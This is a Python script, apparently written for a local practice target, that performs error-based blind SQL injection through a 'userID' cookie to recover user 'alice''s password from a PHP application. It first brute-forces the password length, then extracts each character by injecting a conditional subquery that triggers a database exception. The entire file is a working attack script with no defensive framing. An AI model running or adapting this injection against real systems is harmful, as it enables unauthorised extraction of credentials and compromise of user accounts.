from email import header
import requests

alphanum="abcdefghijklmnopqrstuvwsyz123456789@_"
url = "http://localhost/project/user.php"
cookie_val = {
    "PHPSESSID":"n57i3o7qh28822khrgv8oasho8"
}

def crack_password(num,name):
    count=1
    result=''
    while count <=num:
            for j in alphanum:
                print(f"Trying position: {str(count)}, alphanumeric letter: {j}")
                cookie_val.update({"userID":f"aaaaaaaaaaa'|| (select case when substring(Passwd,{str(count)},1)='{j}' then (select table_name from information_schema.tables) else '' end from login where Username='{name}')||'"})
                x = requests.get(url,cookies=cookie_val)
                if 'exception' in x.text:
                    print(f"Found {j}")
                    result+=j
                    count+=1
                    break
    print(f"--> Done!Your password is {result}") 
def find_length(name):
    count= 2
    result=[]
    while 1:
        print(f"Trying length: {count}")
        cookie_val.update({"userID":f"aaaaaaaaaaa'|| (select case when length(Passwd)={count} then (select table_name from information_schema.tables) else '' end from login where Username='{name}')||'"})
        x = requests.get(url,cookies=cookie_val)
        if 'exception' in x.text:
            print(f"Correct password length is {count}")
            return count
        count+=1

num=find_length("alice")
crack_password(num,"alice")
        




               
